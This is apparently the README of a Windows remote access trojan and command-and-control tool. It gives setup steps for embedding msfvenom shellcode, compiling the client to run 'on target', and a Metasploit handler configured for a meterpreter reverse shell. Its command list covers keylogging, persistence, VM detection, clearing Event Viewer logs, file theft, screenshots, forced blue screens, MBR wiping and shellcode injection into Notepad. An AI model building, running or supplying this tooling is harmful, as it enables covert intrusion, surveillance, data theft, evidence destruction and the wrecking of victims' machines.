# Setup

After cloning the whole project and getting inside of the x86 folder:

1. If you want to be able to use inject86, open Client.c and execute the commented msfvenom command at line 59 (Replace the LHOST/LPORT according to your needs), and then replace the contents of the variable ShellcodeX86 at line 61 with the output of the command.

2. You can generate a new certificate to use if you want (A default one was already provided for ease of use). If you generate a new certificate using Setup.sh, you must copy the contents of public.crt, into the variable 'ServerPublicCertPem' in Client.c:
```bash
cd ..
./Setup.sh cert
```

3. You can now compile. Type:
```bash
./Setup.sh compile
```

4. If everything went correctly, you should now have 4 executables: 2 clients, and 2 servers. If not, there was an error when trying to compile. Make sure you did everything correctly.

5. You can now provide the IP address of the server from both client and server, by passing an argument:
```bash
Server:
	./Server-x86 start 192.168.1.1

Client (On target):
	Client-x86.exe 192.168.1.1
```

6. Before using 'inject86', open a new terminal tab, load msfconsole, and paste the lines below:
```bash
use exploit/multi/handler
set LHOST IP
set LPORT PORT
set payload windows/meterpreter/reverse_tcp
run
```

Info: Fallback shell and startcat have been removed from the x86 version due to some inconsistencies.

# Commands

q : Closes the connection with the client and exits

menu : Prints the menu showing all available commands

startlogger : Starts logging keystrokes and saves them to a file named 'out.txt' on the client machine

stoplogger : Stops logging keystrokes

persistence1 -> persistence3 : Uses hardcoded paths to establish persistence

removepers : Removes all hardcoded persistence methods used on the remote host

isvm : Performs basic checks to determine whether the client is running inside a 
virtual machine and returns the results

isadmin : Verifies whether the server has administrative privileges

cleanlogs : Removes the Event Viewer logs

updateurl : Updates the URL used to download files on the remote host

download : Downloads a file to the remote host using the URL and a specified filename

getfile : Retrieves a file from the remote host and transfers it to the server

diskspace : Returns the disk space for the C: drive

drives : Enumerates all connected drives

screenshot : Takes a screenshot of the remote host's desktop and transfers it to the server

cleanbin : Cleans the recycle bin (No popup)

hostname : Retrieves the hostname of the remote host

popup : Spawns a visible popup on the remote host (For debug)

bsodwin : Crashes the remote host, causing a BSOD (Blue Screen of Death)

wipembr : Overwrites the MBR on the remote host

inject86 : Spawns a new Notepad process and injects shellcode into it to establish a reverse shell connection to the msfconsole listener
